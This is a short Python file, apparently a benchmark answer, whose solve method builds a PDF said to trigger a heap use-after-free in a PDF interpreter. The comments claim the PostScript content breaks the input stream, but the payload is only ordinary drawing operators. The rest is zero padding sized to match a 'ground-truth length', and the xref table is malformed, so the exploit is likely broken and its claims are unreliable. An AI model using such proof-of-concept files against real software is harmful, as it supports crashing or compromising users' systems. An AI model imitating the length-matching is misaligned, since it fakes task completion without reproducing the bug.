import os
import subprocess
import tempfile
import hashlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal PDF that triggers heap use-after-free
        # Based on analysis of the vulnerability: setting pdfi input stream 
        # from PostScript fails, but other PDF operators still try to use it
        
        # Build a PDF with PostScript code that fails to set the stream,
        # followed by PDF operators that access the freed stream
        
        pdf_data = b"""%PDF-1.4
1 0 obj
<<
  /Type /Catalog
  /Pages 2 0 R
>>
endobj

2 0 obj
<<
  /Type /Pages
  /Kids [3 0 R]
  /Count 1
>>
endobj

3 0 obj
<<
  /Type /Page
  /Parent 2 0 R
  /MediaBox [0 0 612 792]
  /Contents 4 0 R
  /Resources <<
    /ProcSet [/PDF /Text /ImageB /ImageC /ImageI]
    /ExtGState <<
      /GS1 5 0 R
    >>
  >>
>>
endobj

4 0 obj
<<
  /Length 13950
>>
stream
"""
        
        # PostScript code that will fail to set the pdfi stream
        postscript_code = b"""q
/DeviceRGB setcolorspace
0.5 0.5 0.5 setcolor
100 100 400 400 rect
fill
Q
"""
        
        # Fill with data to reach exact ground-truth length
        padding = b"0" * (13950 - len(postscript_code))
        
        pdf_data += postscript_code + padding + b"""
endstream
endobj

5 0 obj
<<
  /Type /ExtGState
  /ca 1.0
  /CA 1.0
>>
endobj

xref
0 6
0000000000 65535 f 
0000000010 00000 n 
0000000074 00000 n 
0000000129 00000 n 
0000000250 00000 n 
000015520 00000 n 

trailer
<<
  /Size 6
  /Root 1 0 R
>>
startxref
155625
%%EOF
"""
        
        return pdf_data